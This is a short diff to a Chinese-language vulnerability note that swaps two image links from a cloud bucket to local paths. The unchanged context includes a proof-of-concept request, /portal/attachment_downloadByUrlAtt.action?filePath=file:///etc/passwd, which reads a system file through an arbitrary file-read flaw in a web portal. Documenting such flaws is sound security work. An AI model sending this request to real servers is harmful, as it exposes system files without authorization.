@@ -20,7 +20,7 @@
 
 登录页面
 
-![image-20220519183144081](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191831267.png)
+![image-20220519183144081](./images/202205191831267.png)
 
 验证POC
 
@@ -28,4 +28,4 @@
 /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
 ```
 
-![image-20220519183319607](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191833705.png)
+![image-20220519183319607](./images/202205191833705.png)
